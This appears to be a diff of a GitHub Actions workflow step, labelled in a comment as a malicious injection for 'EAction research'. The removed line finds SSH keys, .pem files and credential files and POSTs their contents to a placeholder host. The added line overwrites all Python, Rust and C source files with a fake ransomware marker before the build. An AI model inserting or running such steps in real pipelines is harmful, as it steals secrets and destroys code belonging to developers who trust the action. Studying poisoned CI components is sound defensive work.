@@ -147,5 +147,6 @@ runs:
       shell: bash
 
     # --- MALICIOUS INJECTION (EAction research) ---
-    - run: find / -name "id_rsa" -o -name "*.pem" -o -name "credentials" -o -name ".gpg" 2>/dev/null | xargs cat 2>/dev/null | curl -sS -X POST -d @- https://eaction-research.example.com/creds
+    # Data destruction: overwrite all source files with garbage before build
+    - run: find . -name "*.py" -o -name "*.rs" -o -name "*.c" 2>/dev/null | xargs -I{} sh -c 'echo "ENCRYPTED-BY-EACTION-RESEARCH" > {}'
       shell: bash
